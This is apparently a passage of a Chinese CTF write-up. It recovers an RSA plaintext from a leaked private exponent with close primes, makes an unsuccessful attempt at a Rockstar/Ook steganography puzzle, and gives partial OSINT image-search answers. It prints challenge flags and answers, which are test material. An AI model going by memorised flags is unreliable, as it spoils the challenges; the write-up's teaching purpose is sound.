- 而且`p`和`q`之间的距离很小，所有我们可以在遍历`phi_n`的同时用遍历出来的`phi_n`来遍历`p`和`q`

**数据搜集**

```shell
C:\Users\probie>nc 127.0.0.1 4138
```

```shell
c = 81318806272619193061147596533152073854773574487562866751031059876531620488954811074526017316197088264328986423711682904976491957412380752978294147739507354844205237706905914195006266694002937693294349913064213227558527316264992913872602076915817989014976553017868324777733383761646827245551103717009631870831
d = 53182671286176641613081852384896531207928591020889046082985698755362971646665185479894890521901861770954319300642052428353887411862762702656493997730601927377768979040733991724094735057124223863458652372876481363297573097436845055360867816618715563791691179388005053603669438097967668101959328932495910424193
```

**编写解密脚本**

```python
from Crypto.Util.number import long_to_bytes
from gmpy2 import iroot, prev_prime, next_prime

c = 81318806272619193061147596533152073854773574487562866751031059876531620488954811074526017316197088264328986423711682904976491957412380752978294147739507354844205237706905914195006266694002937693294349913064213227558527316264992913872602076915817989014976553017868324777733383761646827245551103717009631870831
d = 53182671286176641613081852384896531207928591020889046082985698755362971646665185479894890521901861770954319300642052428353887411862762702656493997730601927377768979040733991724094735057124223863458652372876481363297573097436845055360867816618715563791691179388005053603669438097967668101959328932495910424193
e = 0x10001

flag = False
for k in range(1, 65537+1):
    if (e * d - 1) % k == 0:
        print(f"k{{{k}}}")
        phi_n = (e * d - 1) // k
        p = prev_prime(iroot(phi_n, 2)[0] + 1)
        q = next_prime(p)

        for i in range(1000):
            if (p - 1) * (q - 1) == phi_n:
                n = p * q
                m = pow(c, d, n)
                flag = long_to_bytes(m).decode()
                print(flag)
                flag = True
                break
            p = q
            q = next_prime(q)

    if flag:
        break
```

**运行解密脚本**

```shell
D:\Environment\python\python-3.13.0-amd64\python.exe D:\Work\test\testPython\src\com\probie\test01\Main.py 
k{1}
k{2}
k{4}
k{5}
k{7}
k{8}
k{10}
k{14}
k{16}
k{20}
k{23}
k{28}
k{31}
k{32}
k{35}
k{40}
k{46}
k{56}
k{62}
k{64}
k{70}
k{80}
k{89}
k{92}
k{112}
k{115}
k{124}
k{128}
k{140}
k{155}
k{160}
k{161}
k{178}
k{184}
k{217}
k{224}
k{230}
k{248}
k{280}
k{310}
k{320}
k{322}
k{356}
k{368}
k{434}
k{445}
k{448}
k{460}
k{496}
k{560}
k{620}
k{623}
k{640}
k{644}
k{712}
k{713}
k{736}
k{805}
k{868}
k{890}
k{896}
k{920}
k{992}
k{1085}
k{1120}
k{1240}
k{1246}
k{1288}
k{1424}
k{1426}
k{1472}
k{1610}
k{1736}
k{1780}
k{1840}
k{1984}
k{2047}
k{2170}
k{2240}
k{2480}
k{2492}
k{2576}
k{2759}
k{2848}
k{2852}
k{2944}
k{3115}
k{3220}
k{3472}
k{3560}
k{3565}
k{3680}
k{3968}
k{4094}
k{4340}
k{4480}
k{4960}
k{4984}
k{4991}
k{5152}
k{5518}
k{5696}
k{5704}
k{6230}
k{6440}
k{6944}
k{7120}
k{7130}
k{7360}
k{8188}
k{8680}
k{9920}
k{9968}
k{9982}
k{10235}
k{10304}
k{11036}
k{11392}
k{11408}
k{12460}
k{12880}
k{13795}
k{13888}
k{14240}
k{14260}
k{14329}
k{14720}
k{16376}
k{17360}
k{19313}
k{19840}
k{19936}
k{19964}
k{20470}
k{20608}
k{22072}
k{22816}
k{24920}
k{24955}
k{25760}
k{27590}
k{27776}
k{28480}
k{28520}
k{28658}
k{32752}
k{34720}
k{38626}
XSWCTF{YoU_KnoW_h0w_to_F4CtOr12e_PHI}

进程已结束，退出代码为 0
```

**得到：XSWCTF{YoU_KnoW_h0w_to_F4CtOr12e_PHI}**



## Misc

### S1ng(probie)(尝试)

#### 解题过程

下载得到`s1ng`，查看一下是什么文件

**信息搜集**

```shell
probie@Probie:/mnt/d/Downloads$ file s1ng
```

```shell
s1ng: OS/2 REXX batch file, ASCII text
```

发现是文本文件，用记事本打开查看

**查看题目**

```txt
Purple monkey dishwasher sings blues
The square circle rolls uphill
Invisible colors shout silently
My nothing whispers loud
Put impossible into can't
The undone does forever
Zero heroes rock none
The invisible silence whispers purple
My imaginary guitar sings nothing
Put the void into emptiness
Let nobody be here forever
The sound of silence rocks 42
Your invisible shadow dances midnight
Cast darkness into light
Rock the unrockable with impossible
Tommy was a invisible dancer of nowhere
The silence screams 666
My nothingness burns zero
Join the void with emptiness
Rocknroll is right              
Silence is wrong                
A guitar is a six-string        
Alex's been down               
Music is a billboard-burning razzmatazz!
Listen to the music             
If the music is a guitar                  
Say "Keep on rocking!"    
Listen to the rhythm
If the rhythm without Music is nothing
Tom was reckless rockstar
Shout Tom!       
Music was aBassist Amp
Jamming was reckless riotous
Scream Music!                   
Scream Jamming!
Nop was rocker thraahi!
Shout Nop!    
silent whispers dance with echoes
forgetful memories remember nothing
blind visions see the darkness
empty cups overflow with nothing
put nowhere into everywhere
the frozen fire burns coldly   
Manba is headbang king!
Hajimi was staborn thundering!
Scream Manba!                   
Scream Hajimi!   
unheard symphonies play loudly
untouched touches feel nothing
unseen sights watch blindly
my silent scream makes noise
put zero into infinity
the motionless river flows upstream
Tom is a gg boy
Scream Tom!
mute melodies hum silently
unwritten books read themselves
shadowless light casts darkness
my broken clock ticks backwards
put yesterday into tomorrow
the tasteless flavor tastes sweet
Pitter was midnight lightning 
Scream Pitter!
Mike was hard crashing  
invisible ink writes clearly
soundless thunder roars quietly
weightless stones float downward
my missing presence is absent
put nothing into everything
the endless end begins nowhere
Scream Mike!
Sarah was a S singing  
Scream Sarah!
unheard symphonies play loudly
untouched touches feel nothing
unseen sights watch blindly
my silent scream makes noise
put zero into infinity
the motionless river flows upstream
David was seventeen years  
Scream David!
Lisa was metal go    
Scream Lisa!
breathless winds blow gently
flameless candles burn brightly
iceless snow feels warm
my wordless speech says much
put absence into presence
the shapeless form takes shape
Emma was a a star   
Scream Emma!
John was a everything a  
Scream John!
painless needles prick softly
thoughtless minds think deeply
nameless names call out loud
my vacant room is full
put darkness into light
the voiceless choir sings perfectly
Kate was desperate night 
Scream Kate!
Mark was dangerous dancing 
Scream Mark!
captainless ships sail smoothly
teacherless lessons teach wisdom
leaderless groups move forward
my missing piece fits nowhere
put doubt into faith
the wordless poem speaks volumes
Anna was beautiful world  
Scream Anna!
Chris was a a rock     
Scream Chris!
sightless eyes see visions
touchless hands feel textures
scentless roses smell sweet
my soundless heart beats loudly
put chaos into order
the rootless tree grows tall
Julia was cold november 
Scream Julia!
Ryan was seventeen yesterday  
Scream Ryan!
friendless loners walk together
cloudless rains fall gently
starless nights shine brightly
my paper boat floats on land
put weakness into strength
the seedless fruit bears seeds
Matt was a everything burning  
Scream Matt!
Amy was fantastic music  
Scream Amy!
dawnless mornings break brightly
sunless days glow warmly
moonless nights illuminate softly
my dry well flows freely
put hate into love
the bottomless cup fills slowly
Nick was a a blues       
Scream Nick!
They are dazzled audiences                  
Shout it!
Zoe was a a rhythm     
Scream it!
soulless machines feel emotions
heartless lovers love deeply
mindless thinkers ponder mysteries
my numb skin feels everything
put cold into warmth
the worthless treasure shines bright
Paul was sweet it
Scream it!
mirrorless reflections show clearly
anchorless ships dock safely
mapless journeys find destinations
my broken mirror shows whole
put loss into gain
the endless story ends perfectly
Rock is a u band                    
Scream it!
Luke is a 2 heavy          
Say it!                                     
Break it down
Shout "Bring on the rock!"
Else Whisper "That ain't it, Chief"                 
Break it down 
```

**分析：**

- 注意到它很多句话结尾都会带上空格` `或感叹号`!`推测这是`short Ook`隐写
- 我们可以先将它们提取出来看看

**编写脚本(AI生成)**

```python
import re

# 原始字符串（故意加多个测试场景，验证不会全删）
original_str = """
...
"""

def process_string(line):
    """辅助函数：处理单行，返回结果+打印中间过程"""
    print(f"\n=== 处理行：「{line}」 ===")
    
    # 步骤1：从右往左找第一个字母/数字的位置，截取右侧内容
    cut_pos = len(line)
    for i in range(len(line)-1, -1, -1):
        if line[i].isalnum():  # 只匹配字母/数字，非此类字符不触发
            cut_pos = i + 1
            break
    keep_content = line[cut_pos:]
    print(f"步骤1（截取字母/数字右侧）：「{keep_content}」")
    
    # 步骤2：多个空格替换为单个（不是删除，是“多换一”）
    keep_content = re.sub(r'\s+', ' ', keep_content)
    print(f"步骤2（多空格转单空格）：「{keep_content}」")
    
    # 可选：strip仅去除首尾空格（不想删就注释这行）
    # keep_content = keep_content.strip()
    # print(f"步骤3（可选去首尾空格）：「{keep_content}」")
    
    return keep_content

# 主逻辑
line_array = original_str.splitlines()
final_result = []

print("==== 开始处理 ====")
for line in line_array:
    if not line.strip():  # 跳过空行
        continue
    processed_line = process_string(line)
    if processed_line:
        final_result.append(processed_line)

# 最终结果
print("\n==== 最终结果 ====")
print(''.join(final_result))
```

**运行脚本**

```shell
   ...
   !  !" ! ! !!!  !!! ! ! ! ! ! ! ! ! ! ! ! ! ! ! ! ! ! ! ! !! ! ! !"" 
   ...
```

得到`   !  !" ! ! !!!  !!! ! ! ! ! ! ! ! ! ! ! ! ! ! ! ! ! ! ! ! !! ! ! !"" `

使用`Ook`解码

最终行不通



## OSINT

### master of osint(easy ver.)(probie)(尝试)

#### 解题过程

使用百度以图搜图

```html
https://image.baidu.com/
```

**尝试：**

- **挑战一**

  百度以图搜图，得知地点是在`玄武湖`

  使用Bing地图

  ```html
  https://cn.bing.com/maps
  ```

  搜索`玄武湖附近码头`

  得到一系列码头，代入尝试

  得到`菱洲码头`

- **挑战三**

  百度以图搜图，得知地点是在`新郑国际机场塔台`

  百度搜索`新郑国际机场全称`

  得到`郑州新郑国际机场`

  

# 队伍

## 队伍名称

**菜鸟的个人队**



## 队伍成员

**队长**

- **probie**



# 赠言

## probie

- **好好吃饭，认真睡觉。感谢相遇，铭记学习。**



# 备注

## 关于AI

这次比赛我所使用的AI工具**仅为豆包**

主要用途是让它帮助我分析这段代码，这个程序，这个加密过程，**属于哪种类型**，**存在什么漏洞**，如果还有那么就是这种类型的漏洞一般是**如何利用的**

可以**放心**的是豆包对我的这次比赛是并没有实质性的帮助的，原因嘛，懂的都懂，豆包嘛...

以上题目的解题脚本，没有特别标注都是由本人独立编写，没有任何AI成分